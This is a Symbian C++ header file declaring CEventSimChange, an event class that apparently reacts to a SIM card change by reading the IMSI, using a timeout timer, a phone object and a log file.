/*
 * EventSimChange.h
 *
 *  Created on: 02/ott/2010
 *      Author: Giovanna
 */

#ifndef EVENTSIMCHANGE_H_
#define EVENTSIMCHANGE_H_

#include "AbstractEvent.h"
#include <HT\LogFile.h>
#include <HT\TimeOutTimer.h>
#include <HT\Phone.h>


/**
 *  CEventSimChange
 * 
 */
class CEventSimChange : public CAbstractEvent, public MTimeOutNotifier
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CEventSimChange();

	/**
	 * Two-phased constructor.
	 */
	static CEventSimChange* NewL(const TDesC8& params, TUint32 aTriggerId);

	/**
	 * Two-phased constructor.
	 */
	static CEventSimChange* NewLC(const TDesC8& params, TUint32 aTriggerId);

protected:
	// From CAbstractEvent
	/**
	 * Events MUST implement this method to start their task.
	 */
	virtual void StartEventL();
	
	

private:

	/**
	 * Constructor for performing 1st stage construction
	 */
	CEventSimChange(TUint32 aTriggerId);

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

	// From MTimeOutNotifier
    virtual void TimerExpiredL(TAny* src);
    
    HBufC8* GetImsiBufferL(const TDesC8& aImsi);
    
    
private:
	CTimeOutTimer* iTimer;
	TTime iTimeAt;
	TTimeIntervalSeconds iSecondsInterv;
	CPhone* iPhone;
	RFs	iFs;
	CLogFile*	iLogFile;
	
	//__FLOG_DECLARATION_MEMBER
	};



#endif /* EVENTSIMCHANGE_H_ */
